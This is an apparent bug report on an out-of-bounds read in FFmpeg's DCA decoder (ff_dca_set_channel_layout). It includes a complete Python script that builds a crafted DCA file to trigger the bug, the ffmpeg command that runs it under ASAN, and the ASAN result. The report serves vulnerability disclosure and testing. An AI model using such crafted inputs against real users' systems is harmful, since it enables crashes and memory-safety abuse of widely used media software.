## Bug0: Global Buffer Overflow (OOB Read) on dca2wav[] in ff_dca_set_channel_layout

### Summary

In `ff_dca_set_channel_layout()` (libavcodec/dcadec.c, lines 64–74), the `CHANNEL_ORDER_CODED` path iterates `dca_ch` from 0 to `DCA_SPEAKER_COUNT-1` (31) and indexes into `dca2wav_norm[]` or `dca2wav_wide[]`, which each have only 28 elements. When a crafted DCA file with an XXCH extension sets `xxch_spkr_mask` bits 28–29, the combined `ch_mask` causes `dca2wav[28]` and `dca2wav[29]` to be read out-of-bounds. The read bytes are written into `avctx->ch_layout.u.map[].id`, producing incorrect channel mapping and constituting a global-buffer-overflow memory safety violation.

### PoC

A Python script generates a minimal crafted DCA bitstream (core frame + EXSS/XXCH extension with `xxch_spkr_mask` bits 28–29 set), then ffmpeg is invoked with `-channel_order coded` to trigger the out-of-bounds read in the channel layout path.

```python
#!/usr/bin/env python3
"""
PoC for OOB Read on dca2wav[] in ff_dca_set_channel_layout.

Generates a crafted DCA bitstream: a minimal MONO core frame followed by
an EXSS/XXCH extension whose xxch_spkr_mask has bits 28 and 29 set.
With -channel_order coded, ff_dca_set_channel_layout reads dca2wav[28]
and dca2wav[29] out-of-bounds (arrays are size 28).
"""

import os, struct

class BitBuilder:
    def __init__(self, size):
        self.buf = bytearray(size)
        self.pos = 0

    def write_bits(self, value, nbits):
        for i in range(nbits - 1, -1, -1):
            bit = (value >> i) & 1
            byte_idx = self.pos >> 3
            bit_mask = 1 << (7 - (self.pos & 7))
            if bit:
                self.buf[byte_idx] |= bit_mask
            else:
                self.buf[byte_idx] &= ~bit_mask
            self.pos += 1

    def seek_to_bit(self, bit_pos):
        if bit_pos < self.pos:
            raise ValueError(f"Cannot seek backward {bit_pos} < {self.pos}")
        self.pos = bit_pos

    def cur(self):
        return self.pos

    def get_bytes(self):
        return bytes(self.buf)


CORE_FRAME_SIZE = 512

def build_core_frame():
    b = BitBuilder(CORE_FRAME_SIZE)
    b.write_bits(0x7FFE8001, 32)  # DCA_SYNCWORD_CORE_BE
    b.write_bits(1,  1)   # normal_frame
    b.write_bits(31, 5)   # deficit_samples -> 32
    b.write_bits(0,  1)   # crc_present = 0
    b.write_bits(7,  7)   # npcmblocks -> 8
    b.write_bits(CORE_FRAME_SIZE - 1, 14)
    b.write_bits(0,  6)   # audio_mode = 0 (MONO)
    b.write_bits(13, 4)   # sr_code -> 48000 Hz
    b.write_bits(0,  5)   # br_code
    b.write_bits(0,  1)   # reserved
    b.write_bits(0,  1)   # drc_present
    b.write_bits(0,  1)   # ts_present
    b.write_bits(0,  1)   # aux_present
    b.write_bits(0,  1)   # hdcd_master
    b.write_bits(0,  3)   # ext_audio_type
    b.write_bits(0,  1)   # ext_audio_present = 0 (avoids mandatory CSS CRC)
    b.write_bits(0,  1)   # sync_ssf
    b.write_bits(0,  2)   # lfe_present
    b.write_bits(0,  1)   # predictor_history
    b.write_bits(0,  1)   # filter_perfect
    b.write_bits(0,  4)   # encoder_rev
    b.write_bits(0,  2)   # copy_hist
    b.write_bits(0,  3)   # pcmr_code
    b.write_bits(0,  1)   # sumdiff_front
    b.write_bits(0,  1)   # sumdiff_surround
    b.write_bits(0,  4)   # dn_code
    # Coding header
    b.write_bits(0,  4)   # nsubframes -> 1
    b.write_bits(0,  3)   # nchannels -> 1
    b.write_bits(0,  5)   # nsubbands[0] -> 2
    b.write_bits(1,  5)   # subband_vq_start[0] -> 2
    b.write_bits(0,  3)   # joint_intensity_index[0]
    b.write_bits(0,  2)   # transition_mode_sel[0]
    b.write_bits(0,  3)   # scale_factor_sel[0]
    b.write_bits(5,  3)   # bit_allocation_sel[0] = 5
    b.write_bits(1, 1); b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(7, 3); b.write_bits(7, 3); b.write_bits(7, 3)
    b.write_bits(7, 3); b.write_bits(7, 3)
    # Subframe header
    b.write_bits(0,  2)   # nsubsubframes -> 1
    b.write_bits(0,  3)
    b.write_bits(0,  1); b.write_bits(0, 1)   # prediction_mode bands 0,1
    b.write_bits(0,  4); b.write_bits(0, 4)   # bit_allocation bands 0,1 = 0
    b.write_bits(0xffff, 16)  # DSYNC
    return b.get_bytes()


XXCH_SIZE = 100

def build_xxch_data():
    b = BitBuilder(XXCH_SIZE)
    b.write_bits(0x47004A03, 32)  # DCA_SYNCWORD_XXCH
    b.write_bits(11, 6)           # header_size -> 12 bytes
    b.write_bits(0,  1)           # xxch_crc_present = 0
    b.write_bits(31, 5)           # xxch_mask_nbits -> 32
    b.write_bits(0,  2)           # xxch_nchsets -> 1
    b.write_bits(39, 14)          # xxch_frame_size -> 40 bytes
    b.write_bits(0x00000001, 32)  # xxch_core_mask = 0x01 (MONO)
    b.seek_to_bit(96)             # header_size * 8
    # Channel set header
    b.write_bits(19, 7)           # channel-set header_size -> 20 bytes
    b.write_bits(1,  3)           # nchannels -> 2
    # xxch_spkr_mask: raw 26-bit field = 0xC00000 -> shifted left 6 = bits 28,29 set
    b.write_bits(0xC00000, 26)
    b.write_bits(0,  1)           # downmix_present = 0
    b.write_bits(0,  5); b.write_bits(0, 5)   # nsubbands ch1, ch2
    b.write_bits(1,  5); b.write_bits(1, 5)   # subband_vq_start ch1, ch2
    b.write_bits(0,  3); b.write_bits(0, 3)   # joint_intensity_index
    b.write_bits(0,  2); b.write_bits(0, 2)   # transition_mode_sel
    b.write_bits(0,  3); b.write_bits(0, 3)   # scale_factor_sel
    b.write_bits(5,  3); b.write_bits(5, 3)   # bit_allocation_sel = 5
    for _ in range(2):
        b.write_bits(1, 1); b.write_bits(3, 2); b.write_bits(3, 2)
        b.write_bits(3, 2); b.write_bits(3, 2)
        b.write_bits(7, 3); b.write_bits(7, 3); b.write_bits(7, 3)
        b.write_bits(7, 3); b.write_bits(7, 3)
    b.seek_to_bit(256)            # header_pos2 + header_size2*8
    # Subframe header + audio
    b.write_bits(0, 1); b.write_bits(0, 1)   # prediction_mode ch1
    b.write_bits(0, 1); b.write_bits(0, 1)   # prediction_mode ch2
    b.write_bits(0, 4); b.write_bits(0, 4)   # bit_allocation ch1
    b.write_bits(0, 4); b.write_bits(0, 4)   # bit_allocation ch2
    b.write_bits(0xffff, 16)  # DSYNC
    return b.get_bytes()


EXSS_HEADER_SIZE = 30
EXSS_ASSET_SIZE  = XXCH_SIZE
EXSS_TOTAL_SIZE  = EXSS_HEADER_SIZE + EXSS_ASSET_SIZE

def build_exss(xxch_bytes):
    b = BitBuilder(EXSS_TOTAL_SIZE)
    b.write_bits(0x64582025, 32)                     # DCA_SYNCWORD_SUBSTREAM
    b.write_bits(0,   8)                              # user defined
    b.write_bits(0,   2)                              # exss_index
    b.write_bits(0,   1)                              # wide_hdr = 0
    b.write_bits(EXSS_HEADER_SIZE - 1, 8)
    b.write_bits(EXSS_TOTAL_SIZE - 1, 16)
    b.write_bits(0,   1)                              # static_fields_present = 0
    b.write_bits(EXSS_ASSET_SIZE - 1, 16)
    descr_pos_bits = b.cur()
    b.write_bits(7,   9)                              # descr_size -> 8 bytes
    b.write_bits(0,   3)                              # asset_index
    b.write_bits(0,   1)                              # drc_present
    b.write_bits(0,   1)                              # dialog_norm
    b.write_bits(0,   2)                              # coding_mode = 0
    b.write_bits(0x040, 12)                           # extension_mask = DCA_EXSS_XXCH
    b.write_bits(XXCH_SIZE - 1, 14)                  # xxch_size
    b.seek_to_bit(descr_pos_bits + 8 * 8)
    b.seek_to_bit(EXSS_HEADER_SIZE * 8)
    for i, bv in enumerate(xxch_bytes):
        b.buf[EXSS_HEADER_SIZE + i] = bv
    return b.get_bytes()


def main():
    output_path = 'poc_input.dca'
    core = build_core_frame()
    xxch = build_xxch_data()
    exss = build_exss(xxch)
    data = core + exss
    with open(output_path, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {output_path}")

if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/ffmpeg -f dts -channel_order coded -i poc_input.dca -f null -
cat asan.log.*
```

### Result

ASAN detects a `global-buffer-overflow` (READ of size 1) in `ff_dca_set_channel_layout()` at libavcodec/dcadec.c, reported as "0 bytes after global variable 'dca2wav_norm' of size 28". The call stack confirms the path: `dcadec_decode_frame()` → `ff_dca_core_filter_frame()` → `ff_dca_set_channel_layout()`. The bug is consistently reproduced across multiple runs and the process aborts with the ASAN report.
